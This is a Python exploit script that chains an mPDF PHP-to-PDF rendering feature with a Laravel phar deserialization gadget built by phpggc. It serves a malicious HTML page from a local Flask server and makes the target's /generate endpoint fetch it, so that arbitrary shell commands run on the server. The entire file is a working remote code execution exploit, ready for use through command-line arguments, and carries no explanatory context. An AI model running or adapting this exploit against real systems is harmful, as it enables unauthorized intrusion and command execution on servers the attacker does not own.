import requests
import threading
import time
import subprocess
import sys
from flask import Flask, request
from urllib.parse import urljoin

# git clone https://github.com/ambionics/phpggc
phpggc_bin_path = './phpggc/phpggc'

def run_flask(command):
    app = Flask(__name__)

    gadget = subprocess.check_output([
        f'{phpggc_bin_path}', 'Laravel/RCE6', f'die(`{command}`);', '-p', 'phar', '-b', '-pf', 'a.jpg'
    ]).decode()

    gadget_template = f'''
    <style>
        background: url(data:image/jpeg;base64,{gadget});
    </style>
    '''

    trigger_template = '''
    <img src="#{index}.jpeg" ORIG_SRC="phar://../vendor/mpdf/mpdf/tmp/mpdf/_tempCSSidata{index}_0.jpeg/a.jpg"></img>
    '''

    @app.route("/exploit.html", methods=["GET"])
    def home():
        offset = int(request.args.get('offset', 1))
        exploit = gadget_template
        for i in range(offset, offset+1000):
            exploit += trigger_template.format(index=i)
        return exploit
    
    def run():
        app.run(host='0.0.0.0', debug=False)

    flask_thread = threading.Thread(target=run)
    flask_thread.daemon = True
    flask_thread.start()

def exploit(target_url, rhost):
    target_url = urljoin(target_url, '/generate')
    for i in range(1, 10002, 1000):
        params = {
            'url': f'http://{rhost}:5000/exploit.html?offset={i}'
        }
        print(target_url, params)
        requests.get(target_url, params=params)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print('Usage: python3 exploit.py <target_url> <your_ip> <command>')
        exit()

    target_url = sys.argv[1]
    rhost = sys.argv[2]
    command = sys.argv[3]

    run_flask(command)
    print('Wait 3 seconds for starting flask.')
    time.sleep(3)
    input('Press enter key to continue..')
    exploit(target_url, rhost)

